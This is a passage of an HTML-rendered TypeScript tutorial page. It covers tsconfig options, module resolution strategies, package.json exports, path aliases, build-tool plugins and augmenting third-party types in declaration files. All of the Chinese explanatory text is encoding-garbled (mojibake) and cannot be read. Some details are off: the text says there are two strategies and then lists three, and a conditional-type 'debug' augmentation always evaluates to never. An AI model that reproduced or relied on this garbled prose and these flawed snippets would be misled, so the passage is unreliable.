class="hljs-attr">&quot;forceConsistentCasingInFileNames&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;esModuleInterop&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;skipLibCheck&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;incremental&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;composite&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-1-2-æ¨¡å—è§£æç­–ç•¥å®æˆ˜"><a href="#3-1-2-æ¨¡å—è§£æç­–ç•¥å®æˆ˜" class="headerlink" title="3.1.2 æ¨¡å—è§£æç­–ç•¥å®æˆ˜"></a>3.1.2 æ¨¡å—è§£æç­–ç•¥å®æˆ˜</h3><p><strong>æ¨¡å—è§£æç­–ç•¥æ¦‚è¿°</strong></p><p>TypeScript æ”¯æŒä¸¤ç§æ¨¡å—è§£æç­–ç•¥ï¼š</p><table><thead><tr><th align="left">ç­–ç•¥</th><th align="left">è§¦å‘æ¡ä»¶</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">Classic</td><td align="left">â€œmoduleResolutionâ€: â€œClassicâ€</td><td align="left">TypeScript 1.6 å‰æ—§é¡¹ç›®</td></tr><tr><td align="left">Node</td><td align="left">â€œmoduleResolutionâ€: â€œNodeâ€</td><td align="left">ç°ä»£é¡¹ç›®ï¼ˆé»˜è®¤å€¼ï¼‰</td></tr><tr><td align="left">Node16&#x2F;NodeNext</td><td align="left">â€œmoduleResolutionâ€: â€œNode16â€</td><td align="left">Node.js 16+ å’Œ ESM é¡¹ç›®</td></tr></tbody></table><p><strong>Node è§£æç­–ç•¥è¯¦è§£</strong></p><p>è§£ææµç¨‹ï¼ˆimport { x } from â€˜moduleâ€™ï¼‰ï¼š</p><ol><li>æ£€æŸ¥å½“å‰ç›®å½•çš„ node_modules&#x2F;module.ts&#x2F;module.tsx&#x2F;module.d.ts</li><li>æ£€æŸ¥ node_modules&#x2F;module&#x2F;package.json çš„ types æˆ– main å­—æ®µ</li><li>æ£€æŸ¥ node_modules&#x2F;module&#x2F;index.ts&#x2F;index.d.ts</li><li>é€’å½’æ£€æŸ¥çˆ¶ç›®å½•çš„ node_modulesï¼ˆ..&#x2F;node_modules&#x2F;moduleï¼‰</li></ol><p>æ–‡ä»¶æ‰©å±•åè§£æé¡ºåºï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript">[<br>  <span class="hljs-string">&quot;.ts&quot;</span>, <span class="hljs-string">&quot;.tsx&quot;</span>, <span class="hljs-string">&quot;.d.ts&quot;</span>,         <span class="hljs-comment">// TypeScript æ–‡ä»¶</span><br>  <span class="hljs-string">&quot;.js&quot;</span>, <span class="hljs-string">&quot;.jsx&quot;</span>, <span class="hljs-string">&quot;.cjs&quot;</span>, <span class="hljs-string">&quot;.mjs&quot;</span>,  <span class="hljs-comment">// JavaScript æ–‡ä»¶</span><br>  <span class="hljs-string">&quot;.json&quot;</span>                         <span class="hljs-comment">// JSON æ–‡ä»¶</span><br>]<br></code></pre></td></tr></table></figure><p><strong>Node16&#x2F;NodeNext ç­–ç•¥</strong></p><p>ESM ä¸“å±ç‰¹æ€§ï¼š</p><ol><li>æ”¯æŒ package.json çš„ exports å’Œ imports å­—æ®µ</li><li>ä¸¥æ ¼åŒºåˆ† .js (CommonJS) å’Œ .mjs (ESM) æ–‡ä»¶</li><li>æ”¯æŒ type: â€œmoduleâ€ å£°æ˜</li></ol><p>exports å­—æ®µä¼˜å…ˆçº§ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;exports&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;.&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;import&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist/esm/index.js&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// ESM å…¥å£</span><br>      <span class="hljs-attr">&quot;require&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist/cjs/index.js&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// CommonJS å…¥å£</span><br>      <span class="hljs-attr">&quot;types&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./types/index.d.ts&quot;</span>      <span class="hljs-comment">// ç±»å‹å£°æ˜</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;./feature&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist/feature.js&quot;</span>     <span class="hljs-comment">// å­è·¯å¾„å¯¼å‡º</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>å®æˆ˜é…ç½®ç¤ºä¾‹</strong></p><p>åŸºç¡€é…ç½®ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ESNext&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;moduleResolution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Node16&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./src&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@components/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;components/*&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@utils&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;utils/index&quot;</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å¤šç¯å¢ƒé…ç½®ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;moduleResolution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Node16&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;config/prod&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒ</span><br>        <span class="hljs-string">&quot;config/dev&quot;</span>   <span class="hljs-comment">// å¼€å‘ç¯å¢ƒ</span><br>      <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>è·¯å¾„æ˜ å°„å®æˆ˜</strong></p><ol><li>åˆ«åé…ç½®ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@app/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;src/*&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;shared/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;../shared/*&quot;</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>å¤šè·¯å¾„å›é€€ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;legacy-utils&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;src/utils/v2&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ä¼˜å…ˆä½¿ç”¨ v2</span><br>      <span class="hljs-string">&quot;src/utils/v1&quot;</span>  <span class="hljs-comment">// å›é€€åˆ° v1</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>é€šé…ç¬¦æ‰©å±•ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@assets/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;assets/*&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;public/images/*&quot;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>é—®é¢˜1ï¼šè·¯å¾„æ˜ å°„è¿è¡Œæ—¶å¤±æ•ˆ</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…è¿è¡Œæ—¶è§£æå™¨</span><br>npm install tsconfig-paths --save-dev<br><br><span class="hljs-comment"># Node.js å¯åŠ¨å‘½ä»¤</span><br>node -r tsconfig-paths/register app.ts<br></code></pre></td></tr></table></figure><p>é—®é¢˜2ï¼šå¾ªç¯ä¾èµ–è§£æå¤±è´¥</p><p>é‡æ„æ–¹æ¡ˆï¼š</p><pre class="mermaid">graph LR    A[ModuleA] -->|import| B[ModuleB]    B -->|import| C[ModuleC]    C -->|import| A[ModuleA]        subgraph é‡æ„å    D[Common] --> E[ModuleA]    D[Common] --> F[ModuleB]    D[Common] --> G[ModuleC]    end</pre><p>é—®é¢˜3ï¼šåŠ¨æ€å¯¼å…¥ç±»å‹ä¸¢å¤±</p><p>ç±»å‹å®‰å…¨æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥ç±»å‹å°è£…</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> safeImport&lt;T&gt;(<span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(path);<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span> <span class="hljs-keyword">as</span> T;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChartModule</span> &#123;<br>  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> chart = <span class="hljs-keyword">await</span> safeImport&lt;<span class="hljs-title class_">ChartModule</span>&gt;(<span class="hljs-string">&quot;./chart&quot;</span>);<br>chart.<span class="hljs-title function_">render</span>(data);<br></code></pre></td></tr></table></figure><p><strong>æ„å»ºå·¥å…·é›†æˆ</strong></p><ol><li>Webpack é…ç½®ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">TsconfigPathsPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;tsconfig-paths-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">plugins</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">TsconfigPathsPlugin</span>()],<br>    <span class="hljs-attr">extensions</span>: [<span class="hljs-string">&#x27;.ts&#x27;</span>, <span class="hljs-string">&#x27;.tsx&#x27;</span>, <span class="hljs-string">&#x27;.js&#x27;</span>]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>Vite é…ç½®ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// vite.config.ts</span><br><span class="hljs-keyword">import</span> &#123; defineConfig &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vite&#x27;</span>;<br><span class="hljs-keyword">import</span> tsconfigPaths <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vite-tsconfig-paths&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(&#123;<br>  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">tsconfigPaths</span>()]<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="3-1-3-å£°æ˜æ–‡ä»¶ç”Ÿæˆé…ç½®"><a href="#3-1-3-å£°æ˜æ–‡ä»¶ç”Ÿæˆé…ç½®" class="headerlink" title="3.1.3 å£°æ˜æ–‡ä»¶ç”Ÿæˆé…ç½®"></a>3.1.3 å£°æ˜æ–‡ä»¶ç”Ÿæˆé…ç½®</h3><h3 id="3-1-4-ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥"><a href="#3-1-4-ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥" class="headerlink" title="3.1.4 ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥"></a>3.1.4 ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥</h3><h2 id="3-2-å£°æ˜æ–‡ä»¶-d-ts"><a href="#3-2-å£°æ˜æ–‡ä»¶-d-ts" class="headerlink" title="3.2 å£°æ˜æ–‡ä»¶(.d.ts)"></a>3.2 å£°æ˜æ–‡ä»¶(.d.ts)</h2><h3 id="3-2-1-ç¬¬ä¸‰æ–¹åº“ç±»å‹æ‰©å±•æŠ€å·§"><a href="#3-2-1-ç¬¬ä¸‰æ–¹åº“ç±»å‹æ‰©å±•æŠ€å·§" class="headerlink" title="3.2.1 ç¬¬ä¸‰æ–¹åº“ç±»å‹æ‰©å±•æŠ€å·§"></a>3.2.1 ç¬¬ä¸‰æ–¹åº“ç±»å‹æ‰©å±•æŠ€å·§</h3><p><strong>å£°æ˜æ–‡ä»¶æ‰©å±•åŸºç¡€</strong></p><p>æ ¸å¿ƒæ–¹æ³•ï¼šä½¿ç”¨ declare module è¯­æ³•æ‰©å±•ç¬¬ä¸‰æ–¹åº“ç±»å‹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// global.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;ç¬¬ä¸‰æ–¹åº“å&#x27;</span> &#123;<br>  <span class="hljs-comment">// æ‰©å±•å†…å®¹</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§æ‰©å±•åœºæ™¯</strong></p><ol><li>æ·»åŠ ç¼ºå¤±ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;untyped-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ‰©å±•ç°æœ‰æ¥å£ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HTMLAttributes</span>&lt;T&gt; &#123;<br>    <span class="hljs-comment">// æ·»åŠ è‡ªå®šä¹‰å±æ€§</span><br>    <span class="hljs-attr">customAttr</span>?: <span class="hljs-built_in">string</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;div customAttr=<span class="hljs-string">&quot;value&quot;</span> /&gt;; <span class="hljs-comment">// âœ… ç±»å‹å®‰å…¨</span><br></code></pre></td></tr></table></figure><ol start="3"><li>è¦†ç›–é”™è¯¯ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;flawed-lib&#x27;</span> &#123;<br>  <span class="hljs-comment">// ä¿®æ­£é”™è¯¯è¿”å›ç±»å‹</span><br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Data</span>&gt;; <span class="hljs-comment">// åŸå£°æ˜ä¸º any</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—åˆå¹¶ç­–ç•¥</strong></p><ol><li>æ¥å£åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹å£°æ˜</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">timeout</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;configurable-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>    <span class="hljs-attr">retries</span>?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// æ·»åŠ å¯é€‰å±æ€§</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>å‡½æ•°é‡è½½æ‰©å±•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹å‡½æ•°</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;<br><br><span class="hljs-comment">// æ‰©å±•é‡è½½</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;logger-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// æ·»åŠ å¯¹è±¡æ”¯æŒ</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>å‘½åç©ºé—´åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹å‘½åç©ºé—´</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Analytics</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params"><span class="hljs-attr">event</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•å‘½åç©ºé—´</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;analytics-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Analytics</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">identify</span>(<span class="hljs-params"><span class="hljs-attr">userId</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// æ·»åŠ æ–°æ–¹æ³•</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹æ‰©å±•æœ€ä½³å®è·µ</strong></p><ol><li>æ¨¡å—åŒ–æ‰©å±•æ–‡ä»¶ï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">src/<br>  types/<br>    extensions/<br>      react.d.ts      # Reactæ‰©å±•<br>      lodash.d.ts     # Lodashæ‰©å±•<br>      global.d.ts     # å…¨å±€æ‰©å±•<br>  tsconfig.json<br></code></pre></td></tr></table></figure><ol start="2"><li>æ¡ä»¶æ‰©å±•æ¨¡å¼ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒå˜é‡æ‰©å±•</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-string">&#x27;development&#x27;</span> | <span class="hljs-string">&#x27;production&#x27;</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;configurable-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>    <span class="hljs-attr">debug</span>?: <span class="hljs-title class_">Env</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;development&#x27;</span> ? <span class="hljs-built_in">boolean</span> : <span class="hljs-built_in">never</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>ç±»å‹å®‰å…¨å¢å¼ºï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ·»åŠ ä¸¥æ ¼ç±»å‹çº¦æŸ</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;flexible-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">unknown</span>;<br>  <span class="hljs-keyword">function</span> parse&lt;T&gt;(<span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span>): T; <span class="hljs-comment">// æ³›å‹ç‰ˆæœ¬</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æ‰©å±•æŠ€å·§</strong></p><ol><li>æ¨¡æ¿å­—é¢é‡ç±»å‹æ‰©å±•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 